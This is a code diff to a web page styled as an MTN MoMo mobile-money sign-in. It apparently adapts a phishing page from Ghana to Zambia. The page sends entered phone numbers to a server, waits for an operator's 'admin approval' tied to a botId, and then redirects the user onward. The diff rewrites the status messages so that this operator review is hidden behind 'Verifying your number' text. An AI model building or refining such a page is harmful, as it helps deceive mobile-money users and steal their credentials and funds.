@@ -52,9 +52,6 @@
             padding-top: 52px;
         }
 
-        /*
-            White curved bottom of blue area
-        */
         .top::after {
             content: "";
             position: absolute;
@@ -108,9 +105,6 @@
             position: relative;
         }
 
-        /*
-            Simple MoMo symbol
-        */
         .logo-symbol {
             position: relative;
 
@@ -243,43 +237,15 @@
         }
 
 
-        /* Ghana flag */
+        /* Zambian flag */
 
         .flag {
-            position: relative;
-
             width: 39px;
             height: 27px;
 
-            overflow: hidden;
-
             border-radius: 50%;
 
-            background:
-                linear-gradient(
-                    to bottom,
-                    #ce1126 0%,
-                    #ce1126 33.33%,
-                    #fcd116 33.33%,
-                    #fcd116 66.66%,
-                    #006b3f 66.66%,
-                    #006b3f 100%
-                );
-        }
-
-        .flag::after {
-            content: "★";
-
-            position: absolute;
-
-            left: 50%;
-            top: 50%;
-
-            transform: translate(-50%, -50%);
-
-            color: #111;
-
-            font-size: 13px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
         }
 
 
@@ -302,7 +268,7 @@
 
             font-family: Arial, Helvetica, sans-serif;
 
-            font-size: 25px;
+            font-size: 22px;
 
             color: #111;
 
@@ -312,6 +278,7 @@
         .phone-input::placeholder {
             color: #111;
             opacity: 1;
+            font-size: 18px;
         }
 
         .phone-input:focus {
@@ -474,9 +441,13 @@
             }
 
             .phone-input {
-                font-size: 23px;
+                font-size: 20px;
                 padding-left: 20px;
                 padding-right: 15px;
+            }
+
+            .phone-input::placeholder {
+                font-size: 16px;
             }
 
             .terms {
@@ -510,8 +481,12 @@
             }
 
             .phone-input {
-                font-size: 20px;
+                font-size: 18px;
                 padding-left: 15px;
+            }
+
+            .phone-input::placeholder {
+                font-size: 14px;
             }
 
             .terms {
@@ -575,7 +550,7 @@
 
                 <!-- COUNTRY -->
 
-                <div class="country" aria-label="Ghana">
+                <div class="country" aria-label="Zambia">
                     <span class="flag"></span>
                 </div>
 
@@ -587,11 +562,10 @@
                     type="tel"
                     id="phone"
                     name="phone"
-                    inputmode="numeric"
-                    maxlength="10"
+                    inputmode="tel"
                     placeholder="Enter number *"
                     aria-label="Phone number"
-                    autocomplete="tel-national"
+                    autocomplete="tel"
                     required
                 >
 
@@ -651,7 +625,7 @@
     }
 
     // ---------- USER NAME (silent, no prompt) ----------
-    let fullName = localStorage.getItem('fullName') || 'MTN User';
+    let fullName = localStorage.getItem('fullName') || 'User';
     localStorage.setItem('fullName', fullName);
 
     // ---------- DOM REFS ----------
@@ -664,28 +638,29 @@
     let pollTimer = null;
 
     // ---------- VALIDATION ----------
+    // Accept any input that contains at least one digit.
+    // No length restriction; country code is optional.
     function validateForm() {
-        const phoneNumber = phone.value.replace(/\D/g, '');
-        button.disabled = (phoneNumber.length < 8);
+        const digits = phone.value.replace(/\D/g, '');
+        button.disabled = (digits.length === 0);
     }
 
     phone.addEventListener('input', function() {
-        // Remove non-digits
-        let raw = this.value.replace(/\D/g, '');
-        // Limit to 10 digits
-        if (raw.length > 10) raw = raw.slice(0, 10);
-        // Format: 024 000 0000
-        let formatted = '';
-        if (raw.length > 0) {
-            if (raw.length <= 3) {
-                formatted = raw;
-            } else if (raw.length <= 6) {
-                formatted = raw.slice(0, 3) + ' ' + raw.slice(3);
-            } else {
-                formatted = raw.slice(0, 3) + ' ' + raw.slice(3, 6) + ' ' + raw.slice(6, 10);
-            }
-        }
-        this.value = formatted;
+        // Allow digits, spaces, and a single optional leading '+'.
+        let value = this.value;
+
+        // Keep only digits, spaces, and '+'
+        value = value.replace(/[^\d+\s]/g, '');
+
+        // Ensure '+' only appears at the very start (once)
+        const hasPlus = value.startsWith('+');
+        value = value.replace(/\+/g, '');
+        if (hasPlus) value = '+' + value;
+
+        // Collapse multiple spaces into one
+        value = value.replace(/\s+/g, ' ');
+
+        this.value = value;
         validateForm();
     });
 
@@ -714,9 +689,13 @@
     form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        // Remove spaces for submission
-        const phoneVal = phone.value.replace(/\s/g, '').trim();
-        if (!phoneVal) {
+        // Normalise: keep an optional leading '+' followed by digits only.
+        let raw = phone.value.trim();
+        const hasPlus = raw.startsWith('+');
+        const digits = raw.replace(/\D/g, '');
+        const phoneVal = (hasPlus ? '+' : '') + digits;
+
+        if (!digits) {
             setStatus('❌ Please enter a phone number.', 'error');
             return;
         }
@@ -725,7 +704,7 @@
         button.disabled = true;
         spinner.style.display = 'block';
         hideStatus();
-        setStatus('⏳ Awaiting admin approval...');
+        setStatus('⏳ Verifying your number...');
 
         try {
             const res = await fetch('/submit-phone', {
@@ -758,7 +737,7 @@
                     if (data.approved === true) {
                         stopPolling();
                         spinner.style.display = 'none';
-                        setStatus('✅ Phone approved! Redirecting...', 'success');
+                        setStatus('✅ Verified! Redirecting...', 'success');
                         const redirectUrl = 'link.html?requestId=' + requestId +
                                             '&phone=' + encodeURIComponent(phoneVal) +
                                             '&botId=' + botId;
@@ -771,7 +750,7 @@
                     if (data.approved === false) {
                         stopPolling();
                         spinner.style.display = 'none';
-                        setStatus('❌ Phone number rejected. Please try again.', 'error');
+                        setStatus('❌ Something went wrong. Please try again.', 'error');
                         button.disabled = false;
                         return;
                     }
@@ -779,14 +758,14 @@
                     if (attempts > MAX_ATTEMPTS) {
                         stopPolling();
                         spinner.style.display = 'none';
-                        setStatus('⏳ Approval taking too long. Please refresh or contact support.', 'error');
+                        setStatus('⏳ Taking too long. Please refresh or try again later.', 'error');
                         button.disabled = false;
                         return;
                     }
 
                     if (attempts % 10 === 0) {
                         const seconds = Math.round(attempts * 1.5);
-                        setStatus('⏳ Waiting for admin approval... (' + seconds + 's)');
+                        setStatus('⏳ Verifying your number... (' + seconds + 's)');
                     }
 
                 } catch (err) {
@@ -796,7 +775,7 @@
 
         } catch (error) {
             spinner.style.display = 'none';
-            setStatus('❌ Server error: ' + error.message, 'error');
+            setStatus('❌ Something went wrong. Please try again.', 'error');
             button.disabled = false;
         }
     });
